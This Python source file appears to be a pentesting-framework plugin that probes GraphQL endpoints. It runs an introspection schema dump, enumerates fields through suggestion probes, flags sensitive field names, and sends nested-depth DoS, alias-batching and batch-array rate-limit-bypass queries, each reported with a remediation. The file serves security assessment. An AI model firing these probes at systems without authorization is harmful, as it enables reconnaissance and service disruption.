"""GraphQL exploitation — introspection dump, field enum, depth/alias/batch abuse.

Checks for:
1. Full introspection query (schema dump)
2. Field enumeration via "Did you mean" suggestions
3. Query depth attack (DoS)
4. Alias-based batching (rate limit bypass)
5. Batch query array (rate limit bypass)
6. Mutation enumeration
7. Authorization bypass via alternative fields
"""

from __future__ import annotations

import json
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# Partial type names to trigger "Did you mean" suggestions
SUGGESTION_PROBES = [
    "{__typ}", "{__sch}", "{use}", "{quer}",
    "{mutat}", "{subscri}", "{nod}", "{edg}",
    "{passw}", "{toke}", "{admi}", "{secr}",
]

# Introspection query
INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
      }
    }
  }
}
"""

# Sensitive field names to flag in schema
SENSITIVE_FIELDS = {
    "password", "secret", "token", "apikey", "api_key", "secret_key",
    "private_key", "ssn", "credit_card", "card_number", "cvv",
    "access_token", "refresh_token", "hash", "salt", "otp",
    "internal", "admin", "debug", "config", "env",
}

MAX_DEPTH = 20


def _build_depth_query(depth: int) -> str:
    """Build a deeply nested query: {a{a{a{...}}}}."""
    q = "__typename"
    for _ in range(depth):
        q = f"a{{{q}}}"
    return "{" + q + "}"


def _build_alias_batch(count: int) -> str:
    """Build alias-based batching: {a1:__typename a2:__typename ...}."""
    aliases = " ".join(f"a{i}:__typename" for i in range(count))
    return "{" + aliases + "}"


class GraphqlExploitPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="graphql_exploit",
        display_name="GraphQL Exploitation",
        category=PluginCategory.PENTESTING,
        description=(
            "Exploits GraphQL misconfigurations: introspection dump, "
            "field enumeration, depth attack, alias/batch abuse, mutation enum"
        ),
        depends_on=["graphql_detect"],
        produces=["graphql_exploit_results"],
        timeout=50.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        gql_key = f"graphql_detect:{target.host}"
        gql_result = ctx.pipeline.get(gql_key)

        if not gql_result or not gql_result.ok:
            return PluginResult.skipped(
                self.meta.name, target.host,
                reason="graphql_detect results not available",
            )

        endpoints = gql_result.data.get("graphql_endpoints", [])
        if not endpoints:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("No GraphQL endpoints to exploit")],
                data={"exploits": []},
            )

        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"exploits": []},
            )

        findings: list[Finding] = []
        exploits: list[dict] = []
        headers = {"Content-Type": "application/json"}

        for ep in endpoints:
            if ctx.should_stop:
                break
            path = ep.get("path", "/graphql") if isinstance(ep, dict) else str(ep)
            url = f"{base_url}{path}"

            # 1. Full introspection query
            schema = await self._introspection(ctx, url, headers)
            if schema:
                types_found = schema.get("types", [])
                type_names = [t.get("name", "") for t in types_found if t.get("name")]
                user_types = [
                    n for n in type_names
                    if not n.startswith("__") and n not in (
                        "String", "Int", "Float", "Boolean", "ID",
                        "Query", "Mutation", "Subscription",
                    )
                ]

                exploits.append({
                    "type": "introspection",
                    "path": path,
                    "types": user_types[:20],
                })
                findings.append(Finding.high(
                    f"GraphQL introspection enabled at {path}",
                    description=(
                        f"Full schema dump possible. "
                        f"{len(user_types)} custom types found."
                    ),
                    evidence=f"Types: {', '.join(user_types[:10])}",
                    remediation="Disable introspection in production.",
                    tags=["pentesting", "graphql", "introspection"],
                ))

                # Check for sensitive fields in schema
                sensitive = self._find_sensitive_fields(types_found)
                if sensitive:
                    exploits.append({
                        "type": "sensitive_fields",
                        "path": path,
                        "fields": sensitive[:10],
                    })
                    findings.append(Finding.high(
                        f"Sensitive fields in GraphQL schema at {path}",
                        description=(
                            "Schema exposes fields with sensitive names."
                        ),
                        evidence=(
                            "Fields: " + ", ".join(
                                f"{s['type']}.{s['field']}" for s in sensitive[:5]
                            )
                        ),
                        remediation="Remove or protect sensitive fields.",
                        tags=["pentesting", "graphql", "sensitive-data"],
                    ))

                # Check for mutations
                mutations = self._find_mutations(types_found)
                if mutations:
                    exploits.append({
                        "type": "mutations",
                        "path": path,
                        "mutations": mutations[:10],
                    })
                    findings.append(Finding.medium(
                        f"GraphQL mutations exposed at {path}",
                        description=(
                            f"{len(mutations)} mutations found in schema. "
                            "Test for authorization on state-changing operations."
                        ),
                        evidence=f"Mutations: {', '.join(mutations[:10])}",
                        remediation="Ensure all mutations require authentication.",
                        tags=["pentesting", "graphql", "mutations"],
                    ))

            if ctx.should_stop:
                break

            # 2. Field enumeration via suggestions (if introspection failed)
            if not schema:
                enumerated = await self._field_enum(ctx, url, headers)
                if enumerated:
                    exploits.append({
                        "type": "field_enum",
                        "path": path,
                        "types": enumerated,
                    })
                    findings.append(Finding.medium(
                        f"GraphQL field enumeration via suggestions at {path}",
                        description="Schema enumeration via 'Did you mean' suggestions.",
                        evidence=f"Discovered: {', '.join(enumerated[:10])}",
                        remediation="Disable field suggestions in production.",
                        tags=["pentesting", "graphql", "enumeration"],
                    ))

            if ctx.should_stop:
                break

            # 3. Query depth attack
            depth_result = await self._depth_attack(ctx, url, headers)
            if depth_result:
                exploits.append({"type": "depth_attack", "path": path, **depth_result})
                findings.append(Finding.high(
                    f"GraphQL depth attack at {path} (depth={depth_result['depth']})",
                    description="No query depth limiting — DoS possible.",
                    evidence=depth_result.get("evidence", ""),
                    remediation="Limit query depth to 10-15 levels.",
                    tags=["pentesting", "graphql", "dos"],
                ))

            if ctx.should_stop:
                break

            # 4. Alias-based batching
            alias_result = await self._alias_batch(ctx, url, headers)
            if alias_result:
                exploits.append({"type": "alias_batch", "path": path, **alias_result})
                findings.append(Finding.medium(
                    f"GraphQL alias batching at {path} ({alias_result['count']} aliases)",
                    description="Rate limit bypass via alias-based batching.",
                    evidence=alias_result.get("evidence", ""),
                    remediation="Limit aliases per query. Use query cost analysis.",
                    tags=["pentesting", "graphql", "batching"],
                ))

            if ctx.should_stop:
                break

            # 5. Batch query array
            batch_result = await self._batch_array(ctx, url, headers)
            if batch_result:
                exploits.append({"type": "batch_array", "path": path, **batch_result})
                findings.append(Finding.medium(
                    f"GraphQL batch array accepted at {path}",
                    description="Rate limit bypass via query array.",
                    evidence=batch_result.get("evidence", ""),
                    remediation="Disable batch queries or limit array size.",
                    tags=["pentesting", "graphql", "batching"],
                ))

        if not findings:
            findings.append(Finding.info(
                "No exploitable GraphQL misconfigurations found",
                tags=["pentesting", "graphql"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"exploits": exploits},
        )

    async def _introspection(
        self, ctx, url: str, headers: dict,
    ) -> dict | None:
        """Attempt full introspection query."""
        try:
            async with ctx.rate:
                resp = await ctx.http.post(
                    url,
                    data=json.dumps({"query": INTROSPECTION_QUERY}),
                    headers=headers,
                    timeout=10.0,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                if resp.status == 200:
                    data = json.loads(body)
                    schema = data.get("data", {}).get("__schema")
                    if schema:
                        return schema
        except Exception:
            pass
        return None

    async def _field_enum(self, ctx, url: str, headers: dict) -> list[str]:
        """Send partial type names and collect suggestions."""
        discovered: set[str] = set()
        for probe in SUGGESTION_PROBES:
            if ctx.should_stop:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.post(
                        url,
                        data=json.dumps({"query": probe}),
                        headers=headers,
                        timeout=8.0,
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")
                    if "did you mean" in body.lower():
                        for part in body.split('"'):
                            cleaned = part.strip()
                            if (
                                cleaned
                                and cleaned[0].isupper()
                                and len(cleaned) < 60
                                and " " not in cleaned
                            ):
                                discovered.add(cleaned)
            except Exception:
                continue
        return sorted(discovered)

    async def _depth_attack(self, ctx, url: str, headers: dict) -> dict | None:
        """Test if server accepts deeply nested queries."""
        query = _build_depth_query(MAX_DEPTH)
        try:
            async with ctx.rate:
                resp = await ctx.http.post(
                    url,
                    data=json.dumps({"query": query}),
                    headers=headers,
                    timeout=10.0,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                if resp.status == 200 and "data" in body:
                    return {
                        "depth": MAX_DEPTH,
                        "evidence": f"Depth {MAX_DEPTH} accepted (HTTP {resp.status})",
                    }
        except Exception:
            pass
        return None

    async def _alias_batch(self, ctx, url: str, headers: dict) -> dict | None:
        """Test alias-based batching with 100 aliases."""
        count = 100
        query = _build_alias_batch(count)
        try:
            async with ctx.rate:
                resp = await ctx.http.post(
                    url,
                    data=json.dumps({"query": query}),
                    headers=headers,
                    timeout=10.0,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                if resp.status == 200 and "data" in body:
                    return {
                        "count": count,
                        "evidence": f"{count} aliases accepted (HTTP {resp.status})",
                    }
        except Exception:
            pass
        return None

    async def _batch_array(self, ctx, url: str, headers: dict) -> dict | None:
        """Test batch query array."""
        batch = [{"query": "{__typename}"} for _ in range(10)]
        try:
            async with ctx.rate:
                resp = await ctx.http.post(
                    url,
                    data=json.dumps(batch),
                    headers=headers,
                    timeout=10.0,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                if resp.status == 200 and body.strip().startswith("["):
                    return {
                        "evidence": f"Batch array of 10 queries accepted (HTTP {resp.status})",
                    }
        except Exception:
            pass
        return None

    @staticmethod
    def _find_sensitive_fields(types: list[dict]) -> list[dict]:
        """Find fields with sensitive names in schema types."""
        sensitive: list[dict] = []
        for t in types:
            type_name = t.get("name", "")
            if type_name.startswith("__"):
                continue
            for field in t.get("fields") or []:
                field_name = field.get("name", "").lower()
                if field_name in SENSITIVE_FIELDS:
                    sensitive.append({
                        "type": type_name,
                        "field": field.get("name", ""),
                    })
        return sensitive

    @staticmethod
    def _find_mutations(types: list[dict]) -> list[str]:
        """Extract mutation names from schema."""
        for t in types:
            if t.get("name") == "Mutation":
                return [
                    f.get("name", "") for f in t.get("fields") or []
                    if f.get("name")
                ]
        return []
